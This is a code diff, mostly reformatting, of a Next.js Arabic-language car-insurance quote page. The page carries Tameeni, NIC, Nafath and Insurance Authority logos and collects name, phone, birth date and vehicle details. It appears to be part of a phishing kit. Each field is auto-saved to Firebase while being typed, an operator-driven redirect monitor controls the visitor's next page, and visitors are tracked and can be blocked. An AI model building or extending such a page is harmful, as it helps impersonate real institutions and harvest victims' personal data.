@@ -1,140 +1,189 @@
-"use client"
+"use client";
 
-import { useEffect, useState } from "react"
-import { useRouter } from "next/navigation"
-import { Input } from "@/components/ui/input"
+import { useEffect, useState } from "react";
+import { useRouter } from "next/navigation";
+import { Input } from "@/components/ui/input";
 import {
-  User, Phone, Calendar, Car, Tag, Wrench,
-  Settings2, ShieldCheck, Search, Loader2, RefreshCw,
-} from 'lucide-react'
-import { FullPageLoader } from "@/components/loader"
-import { StepShell } from "@/components/step-shell"
-import { getOrCreateVisitorID, checkIfBlocked } from "@/lib/visitor-tracking"
-import { useAutoSave } from "@/hooks/use-auto-save"
-import { useRedirectMonitor } from "@/hooks/use-redirect-monitor"
-import { addData } from "@/lib/firebase"
-import { getSelectedVehicle } from "@/lib/vehicle-api"
+  User,
+  Phone,
+  Calendar,
+  Car,
+  Tag,
+  Wrench,
+  Settings2,
+  ShieldCheck,
+  Search,
+  Loader2,
+  RefreshCw,
+} from "lucide-react";
+import { FullPageLoader } from "@/components/loader";
+import { StepShell } from "@/components/step-shell";
+import { getOrCreateVisitorID, checkIfBlocked } from "@/lib/visitor-tracking";
+import { useAutoSave } from "@/hooks/use-auto-save";
+import { useRedirectMonitor } from "@/hooks/use-redirect-monitor";
+import { addData } from "@/lib/firebase";
+import { getSelectedVehicle } from "@/lib/vehicle-api";
 
 function generateCaptcha() {
-  return Array.from({ length: 4 }, () => Math.floor(Math.random() * 10)).join(" ")
+  return Array.from({ length: 4 }, () => Math.floor(Math.random() * 10)).join(
+    " ",
+  );
 }
-const CAPTCHA_COLORS = ["#e53935", "#1976d2", "#388e3c", "#f57c00"]
+const CAPTCHA_COLORS = ["#e53935", "#1976d2", "#388e3c", "#f57c00"];
 
 const FIELD_CLASS =
-  "w-full h-12 text-right text-sm border border-gray-200 rounded-xl px-4 bg-white focus:border-[#1976d2] focus:outline-none transition-all text-gray-800 font-medium"
+  "w-full h-12 text-right text-sm border border-gray-200 rounded-xl px-4 bg-white focus:border-[#1976d2] focus:outline-none transition-all text-gray-800 font-medium";
 
-function FieldLabel({ icon, children }: { icon: React.ReactNode; children: React.ReactNode }) {
+function FieldLabel({
+  icon,
+  children,
+}: {
+  icon: React.ReactNode;
+  children: React.ReactNode;
+}) {
   return (
-    <label className="flex items-center gap-2 text-sm font-bold text-gray-700 mb-1.5 w-full">
-      {children}
+    <label
+      className="flex items-center gap-2 text-sm font-bold text-gray-700 mb-1.5 w-full"
+      dir="rtl"
+    >
       <span className="text-[#1976d2]">{icon}</span>
+
+      {children}
     </label>
-  )
+  );
 }
 
 export default function InsurancePage() {
-  const router = useRouter()
-  const [visitorID] = useState(() => getOrCreateVisitorID())
-  const [loading, setLoading] = useState(true)
-  const [isBlocked, setIsBlocked] = useState(false)
-  const [submitting, setSubmitting] = useState(false)
+  const router = useRouter();
+  const [visitorID] = useState(() => getOrCreateVisitorID());
+  const [loading, setLoading] = useState(true);
+  const [isBlocked, setIsBlocked] = useState(false);
+  const [submitting, setSubmitting] = useState(false);
 
   // Form fields
-  const [fullName, setFullName] = useState("")
-  const [phoneNumber, setPhoneNumber] = useState("")
-  const [birthDate, setBirthDate] = useState("")
-  const [insuranceCoverage, setInsuranceCoverage] = useState("comprehensive")
-  const [insuranceStartDate, setInsuranceStartDate] = useState("")
-  const [vehicleUsage, setVehicleUsage] = useState("")
-  const [vehicleValue, setVehicleValue] = useState("")
-  const [vehicleYear, setVehicleYear] = useState("")
-  const [vehicleModel, setVehicleModel] = useState("")
-  const [repairLocation, setRepairLocation] = useState("agency")
+  const [fullName, setFullName] = useState("");
+  const [phoneNumber, setPhoneNumber] = useState("");
+  const [birthDate, setBirthDate] = useState("");
+  const [insuranceCoverage, setInsuranceCoverage] = useState("comprehensive");
+  const [insuranceStartDate, setInsuranceStartDate] = useState("");
+  const [vehicleUsage, setVehicleUsage] = useState("");
+  const [vehicleValue, setVehicleValue] = useState("");
+  const [vehicleYear, setVehicleYear] = useState("");
+  const [vehicleModel, setVehicleModel] = useState("");
+  const [repairLocation, setRepairLocation] = useState("agency");
 
   // Captcha
-  const [captchaText, setCaptchaText] = useState("3 5 1 9")
-  const [captchaInput, setCaptchaInput] = useState("")
-  const [captchaError, setCaptchaError] = useState(false)
+  const [captchaText, setCaptchaText] = useState("3 5 1 9");
+  const [captchaInput, setCaptchaInput] = useState("");
+  const [captchaError, setCaptchaError] = useState(false);
 
   useEffect(() => {
-    setCaptchaText(generateCaptcha())
+    setCaptchaText(generateCaptcha());
     // Pre-fill start date with today
-    const today = new Date().toISOString().split("T")[0]
-    setInsuranceStartDate(today)
+    const today = new Date().toISOString().split("T")[0];
+    setInsuranceStartDate(today);
     // Pre-fill name/phone from home step
     try {
-      const hfd = JSON.parse(localStorage.getItem("homeFormData") || "{}")
-      if (hfd.ownerName) setFullName(hfd.ownerName)
-      if (hfd.phoneNumber) setPhoneNumber(hfd.phoneNumber)
-    } catch { /* ignore */ }
-  }, [])
+      const hfd = JSON.parse(localStorage.getItem("homeFormData") || "{}");
+      if (hfd.ownerName) setFullName(hfd.ownerName);
+      if (hfd.phoneNumber) setPhoneNumber(hfd.phoneNumber);
+    } catch {
+      /* ignore */
+    }
+  }, []);
 
   useAutoSave({
     visitorId: visitorID,
     pageName: "insur",
-    data: { fullName, phoneNumber, birthDate, insuranceCoverage, insuranceStartDate, vehicleUsage, vehicleValue, vehicleYear, vehicleModel, repairLocation },
-  })
+    data: {
+      fullName,
+      phoneNumber,
+      birthDate,
+      insuranceCoverage,
+      insuranceStartDate,
+      vehicleUsage,
+      vehicleValue,
+      vehicleYear,
+      vehicleModel,
+      repairLocation,
+    },
+  });
 
-  useRedirectMonitor({ visitorId: visitorID, currentPage: "insur" })
+  useRedirectMonitor({ visitorId: visitorID, currentPage: "insur" });
 
   useEffect(() => {
     const init = async () => {
-      const blocked = await checkIfBlocked(visitorID)
-      if (blocked) { setIsBlocked(true); setLoading(false); return }
-      setLoading(false)
-    }
-    init()
-  }, [visitorID])
+      const blocked = await checkIfBlocked(visitorID);
+      if (blocked) {
+        setIsBlocked(true);
+        setLoading(false);
+        return;
+      }
+      setLoading(false);
+    };
+    init();
+  }, [visitorID]);
 
   useEffect(() => {
-    const vehicleData = getSelectedVehicle()
+    const vehicleData = getSelectedVehicle();
     if (vehicleData) {
-      setVehicleYear(vehicleData.year.toString())
-      setVehicleModel(`${vehicleData.maker} ${vehicleData.model}`)
+      setVehicleYear(vehicleData.year.toString());
+      setVehicleModel(`${vehicleData.maker} ${vehicleData.model}`);
     }
-  }, [])
+  }, []);
 
   const handleVehicleValueChange = (e: React.ChangeEvent<HTMLInputElement>) => {
-    setVehicleValue(e.target.value.replace(/[^0-9]/g, ""))
-  }
+    setVehicleValue(e.target.value.replace(/[^0-9]/g, ""));
+  };
 
   const handleSubmit = async (e: React.FormEvent) => {
-    e.preventDefault()
-    const valueNum = parseInt(vehicleValue)
+    e.preventDefault();
+    const valueNum = parseInt(vehicleValue);
     if (valueNum < 10000 || valueNum > 1000000) {
-      alert("قيمة المركبة يجب أن تكون بين 10,000 و 1,000,000 ريال")
-      return
+      alert("قيمة المركبة يجب أن تكون بين 10,000 و 1,000,000 ريال");
+      return;
     }
-    const captchaClean = captchaText.replace(/\s/g, "")
-    if (captchaInput !== captchaClean) { setCaptchaError(true); return }
-    setSubmitting(true)
+    const captchaClean = captchaText.replace(/\s/g, "");
+    if (captchaInput !== captchaClean) {
+      setCaptchaError(true);
+      return;
+    }
+    setSubmitting(true);
     await addData({
       id: visitorID,
-      fullName, phoneNumber, birthDate,
-      insuranceCoverage, insuranceStartDate,
-      vehicleUsage, vehicleValue, vehicleYear, vehicleModel,
+      fullName,
+      phoneNumber,
+      birthDate,
+      insuranceCoverage,
+      insuranceStartDate,
+      vehicleUsage,
+      vehicleValue,
+      vehicleYear,
+      vehicleModel,
       repairLocation,
       currentStep: 3,
       currentPage: "compar",
       insurCompletedAt: new Date().toISOString(),
-    })
-    router.push("/compar")
-  }
+    });
+    router.push("/compar");
+  };
 
-  if (loading) return <FullPageLoader />
+  if (loading) return <FullPageLoader />;
 
   if (isBlocked) {
     return (
       <div className="min-h-screen flex items-center justify-center bg-gray-50">
         <div className="text-center p-8 bg-white rounded-lg shadow-lg max-w-md">
-          <h1 className="text-2xl font-bold text-red-600 mb-4">تم حظر الوصول</h1>
+          <h1 className="text-2xl font-bold text-red-600 mb-4">
+            تم حظر الوصول
+          </h1>
           <p className="text-gray-600">عذراً، تم حظر وصولك إلى هذه الخدمة.</p>
         </div>
       </div>
-    )
+    );
   }
 
-  const years = Array.from({ length: 27 }, (_, i) => 2026 - i)
+  const years = Array.from({ length: 27 }, (_, i) => 2026 - i);
 
   return (
     <StepShell
@@ -144,10 +193,11 @@ export default function InsurancePage() {
       maxWidthClassName="max-w-md"
     >
       <form onSubmit={handleSubmit} className="space-y-4" dir="rtl">
-
         {/* Full name */}
         <div>
-          <FieldLabel icon={<User className="w-4 h-4" />}>الاسم الكامل</FieldLabel>
+          <FieldLabel icon={<User className="w-4 h-4" />}>
+            الاسم الكامل
+          </FieldLabel>
           <Input
             placeholder="أدخل الاسم الكامل"
             value={fullName}
@@ -161,13 +211,17 @@ export default function InsurancePage() {
 
         {/* Phone */}
         <div>
-          <FieldLabel icon={<Phone className="w-4 h-4" />}>رقم الهاتف</FieldLabel>
+          <FieldLabel icon={<Phone className="w-4 h-4" />}>
+            رقم الهاتف
+          </FieldLabel>
           <Input
             type="tel"
             inputMode="numeric"
             placeholder="05XXXXXXXX"
             value={phoneNumber}
-            onChange={(e) => setPhoneNumber(e.target.value.replace(/\D/g, "").slice(0, 10))}
+            onChange={(e) =>
+              setPhoneNumber(e.target.value.replace(/\D/g, "").slice(0, 10))
+            }
             className={FIELD_CLASS}
             dir="ltr"
             required
@@ -176,7 +230,9 @@ export default function InsurancePage() {
 
         {/* Birth date */}
         <div>
-          <FieldLabel icon={<Calendar className="w-4 h-4" />}>تاريخ الميلاد</FieldLabel>
+          <FieldLabel icon={<Calendar className="w-4 h-4" />}>
+            تاريخ الميلاد
+          </FieldLabel>
           <input
             type="date"
             value={birthDate}
@@ -188,7 +244,9 @@ export default function InsurancePage() {
 
         {/* Policy start date */}
         <div>
-          <FieldLabel icon={<Calendar className="w-4 h-4" />}>تاريخ بدء الوثيقة</FieldLabel>
+          <FieldLabel icon={<Calendar className="w-4 h-4" />}>
+            تاريخ بدء الوثيقة
+          </FieldLabel>
           <input
             type="date"
             value={insuranceStartDate}
@@ -201,7 +259,9 @@ export default function InsurancePage() {
 
         {/* Vehicle usage */}
         <div>
-          <FieldLabel icon={<Car className="w-4 h-4" />}>الغرض من استخدام المركبة</FieldLabel>
+          <FieldLabel icon={<Car className="w-4 h-4" />}>
+            الغرض من استخدام المركبة
+          </FieldLabel>
           <select
             value={vehicleUsage}
             onChange={(e) => setVehicleUsage(e.target.value)}
@@ -221,7 +281,9 @@ export default function InsurancePage() {
 
         {/* Vehicle value */}
         <div>
-          <FieldLabel icon={<Tag className="w-4 h-4" />}>القيمة التقديرية للمركبة</FieldLabel>
+          <FieldLabel icon={<Tag className="w-4 h-4" />}>
+            القيمة التقديرية للمركبة
+          </FieldLabel>
           <Input
             type="tel"
             inputMode="numeric"
@@ -232,14 +294,20 @@ export default function InsurancePage() {
             dir="rtl"
             required
           />
-          {vehicleValue && (parseInt(vehicleValue) < 10000 || parseInt(vehicleValue) > 1000000) && (
-            <p className="text-xs text-red-500 mt-1 text-right">القيمة يجب أن تكون بين 10,000 و 1,000,000 ريال</p>
-          )}
+          {vehicleValue &&
+            (parseInt(vehicleValue) < 10000 ||
+              parseInt(vehicleValue) > 1000000) && (
+              <p className="text-xs text-red-500 mt-1 text-right">
+                القيمة يجب أن تكون بين 10,000 و 1,000,000 ريال
+              </p>
+            )}
         </div>
 
         {/* Vehicle year */}
         <div>
-          <FieldLabel icon={<Wrench className="w-4 h-4" />}>سنة الصنع</FieldLabel>
+          <FieldLabel icon={<Wrench className="w-4 h-4" />}>
+            سنة الصنع
+          </FieldLabel>
           <select
             value={vehicleYear}
             onChange={(e) => setVehicleYear(e.target.value)}
@@ -248,14 +316,18 @@ export default function InsurancePage() {
           >
             <option value="">اختر</option>
             {years.map((year) => (
-              <option key={year} value={year}>{year}</option>
+              <option key={year} value={year}>
+                {year}
+              </option>
             ))}
           </select>
         </div>
 
         {/* Repair location — pill buttons */}
         <div>
-          <FieldLabel icon={<Settings2 className="w-4 h-4" />}>مكان الإصلاح</FieldLabel>
+          <FieldLabel icon={<Settings2 className="w-4 h-4" />}>
+            مكان الإصلاح
+          </FieldLabel>
           <div className="grid grid-cols-2 gap-2">
             {[
               { value: "workshop", label: "الورشة", icon: "🔧" },
@@ -281,7 +353,15 @@ export default function InsurancePage() {
         {/* Captcha */}
         <div>
           <div className="flex items-center justify-between mb-1.5">
-            <button type="button" onClick={() => { setCaptchaText(generateCaptcha()); setCaptchaInput(""); setCaptchaError(false); }} className="text-[#1976d2]">
+            <button
+              type="button"
+              onClick={() => {
+                setCaptchaText(generateCaptcha());
+                setCaptchaInput("");
+                setCaptchaError(false);
+              }}
+              className="text-[#1976d2]"
+            >
               <RefreshCw className="w-4 h-4" />
             </button>
             <label className="flex items-center gap-2 text-sm font-bold text-gray-700">
@@ -295,20 +375,34 @@ export default function InsurancePage() {
               inputMode="numeric"
               placeholder="أدخل رمز التحقق"
               value={captchaInput}
-              onChange={(e) => { setCaptchaInput(e.target.value.replace(/\D/g, "").slice(0, 4)); setCaptchaError(false); }}
+              onChange={(e) => {
+                setCaptchaInput(e.target.value.replace(/\D/g, "").slice(0, 4));
+                setCaptchaError(false);
+              }}
               className={`h-12 rounded-xl border text-sm text-center flex-1 ${captchaError ? "border-red-400 bg-red-50" : "border-gray-200 focus:border-[#1976d2]"}`}
               dir="ltr"
               required
             />
             <div className="h-12 px-4 flex items-center justify-center rounded-xl border-2 border-dashed border-gray-300 bg-gray-50 gap-1.5 select-none min-w-[90px]">
               {captchaText.split(" ").map((digit, i) => (
-                <span key={i} className="text-xl font-black" style={{ color: CAPTCHA_COLORS[i % CAPTCHA_COLORS.length], fontFamily: "monospace" }}>
+                <span
+                  key={i}
+                  className="text-xl font-black"
+                  style={{
+                    color: CAPTCHA_COLORS[i % CAPTCHA_COLORS.length],
+                    fontFamily: "monospace",
+                  }}
+                >
                   {digit}
                 </span>
               ))}
             </div>
           </div>
-          {captchaError && <p className="text-xs text-red-600 mt-1 text-right">⚠ رمز التحقق غير صحيح</p>}
+          {captchaError && (
+            <p className="text-xs text-red-600 mt-1 text-right">
+              ⚠ رمز التحقق غير صحيح
+            </p>
+          )}
         </div>
 
         {/* Submit */}
@@ -317,29 +411,47 @@ export default function InsurancePage() {
           disabled={submitting}
           className="w-full h-13 py-3.5 rounded-xl bg-[#8c9eb5] hover:bg-[#7a8fa5] text-white font-bold text-base transition-all disabled:opacity-70 flex items-center justify-center gap-2"
         >
-          {submitting ? <Loader2 className="w-5 h-5 animate-spin" /> : <Search className="w-5 h-5" />}
+          {submitting ? (
+            <Loader2 className="w-5 h-5 animate-spin" />
+          ) : (
+            <Search className="w-5 h-5" />
+          )}
           إظهار العروض
         </button>
 
         {/* Disclaimer */}
         <p className="text-[11px] text-gray-500 leading-relaxed text-right">
-          بالضغط على «إظهار العروض» فأنت توافق على منح شركة تأميني الحق في الاستعلام من وزارة التجارة و/أو مركز المعلومات الوطني عن بياناتي
+          بالضغط على «إظهار العروض» فأنت توافق على منح شركة تأميني الحق في
+          الاستعلام من وزارة التجارة و/أو مركز المعلومات الوطني عن بياناتي
         </p>
-
       </form>
 
       {/* Partner logos */}
       <div className="mt-5 pt-4 border-t border-gray-100">
         <div className="flex items-center justify-center gap-4 flex-wrap">
-          <img src="/tameeni-logo.webp" alt="تأميني" className="h-7 w-7 rounded-lg opacity-70" />
-          <img src="/NIC-logo.png" alt="NIC" className="h-6 object-contain opacity-60" />
-          <img src="/nafad-logo-new.png" alt="نافذ" className="h-6 object-contain opacity-60" />
+          <img
+            src="/tameeni-logo.webp"
+            alt="تأميني"
+            className="h-7 w-7 rounded-lg opacity-70"
+          />
+          <img
+            src="/NIC-logo.png"
+            alt="NIC"
+            className="h-6 object-contain opacity-60"
+          />
+          <img
+            src="/nafad-logo-new.png"
+            alt="نافذ"
+            className="h-6 object-contain opacity-60"
+          />
           <div className="flex items-center gap-1">
             <span className="text-[10px] font-bold text-gray-400">IA</span>
-            <span className="text-[10px] text-gray-400">Insurance Authority</span>
+            <span className="text-[10px] text-gray-400">
+              Insurance Authority
+            </span>
           </div>
         </div>
       </div>
     </StepShell>
-  )
+  );
 }
